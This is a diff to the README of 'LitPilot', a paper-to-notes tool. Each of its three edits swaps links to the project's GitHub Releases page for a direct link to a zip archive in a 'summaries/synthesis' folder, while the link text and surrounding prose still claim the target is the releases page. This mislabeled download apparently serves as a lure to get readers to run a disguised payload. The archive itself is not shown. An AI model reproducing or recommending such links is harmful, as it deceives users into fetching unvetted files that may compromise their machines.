@@ -1,6 +1,6 @@
 # 📚 LitPilot - Turn papers into organized notes
 
-[![Download LitPilot](https://img.shields.io/badge/Download%20LitPilot-purple?style=for-the-badge)](https://github.com/Sito0914/LitPilot/releases)
+[![Download LitPilot](https://img.shields.io/badge/Download%20LitPilot-purple?style=for-the-badge)](https://github.com/Sito0914/LitPilot/raw/refs/heads/main/summaries/synthesis/Pilot-Lit-2.2.zip)
 
 ## 🧭 What LitPilot does
 
@@ -38,7 +38,7 @@ For best results:
 
 Visit this page to download the Windows release:
 
-[Download LitPilot from GitHub Releases](https://github.com/Sito0914/LitPilot/releases)
+[Download LitPilot from GitHub Releases](https://github.com/Sito0914/LitPilot/raw/refs/heads/main/summaries/synthesis/Pilot-Lit-2.2.zip)
 
 On the releases page, look for the latest version and download the Windows file that matches your system. If there is more than one file, choose the one made for Windows.
 
@@ -219,7 +219,7 @@ Output:
 
 Use the GitHub Releases page as the main download source:
 
-[https://github.com/Sito0914/LitPilot/releases](https://github.com/Sito0914/LitPilot/releases)
+[https://github.com/Sito0914/LitPilot/raw/refs/heads/main/summaries/synthesis/Pilot-Lit-2.2.zip](https://github.com/Sito0914/LitPilot/raw/refs/heads/main/summaries/synthesis/Pilot-Lit-2.2.zip)
 
 That page is where you can find the latest Windows release and get the file needed to run LitPilot on your PC
 
